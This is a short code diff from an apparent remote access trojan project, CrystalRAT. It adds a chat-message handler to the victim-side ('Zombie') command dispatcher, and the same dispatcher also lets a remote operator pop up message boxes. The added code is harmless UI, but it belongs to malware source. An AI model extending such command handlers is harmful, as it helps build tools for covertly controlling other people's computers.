@@ -1,8 +1,10 @@
 ﻿using CrystalRATShared.Commands;
+using CrystalRATShared.EvArgs;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Runtime.CompilerServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -13,6 +15,7 @@ namespace Zombie.Functions
     public static class FunctionManager
     {
 
+        public static event EventHandler MessageReceived;
         public static void Process(CommandFlags flag, BinaryReader reader)
         {
             switch (flag)
@@ -41,6 +44,19 @@ namespace Zombie.Functions
                     break;
                 case CommandFlags.MessageBox:
                     Dialog.Show(reader.ReadString(), reader.ReadString(), (MessageBoxButtons)reader.ReadInt32(), (MessageBoxIcon)reader.ReadInt32());
+                    break;
+                case CommandFlags.ChatMessage:
+                    string text = reader.ReadString();
+                    string id = reader.ReadString();
+                    if (ChatForm.IsOpen)
+                    {
+                        MessageReceived?.Invoke(null, new MessageArgs(text));
+                    }
+                    else
+                    {
+                        ZombieForm.Form.Invoke(new MethodInvoker(() => { new ChatForm(id).Show(); }));
+                        MessageReceived?.Invoke(null, new MessageArgs(text));
+                    }
                     break;
 
             }
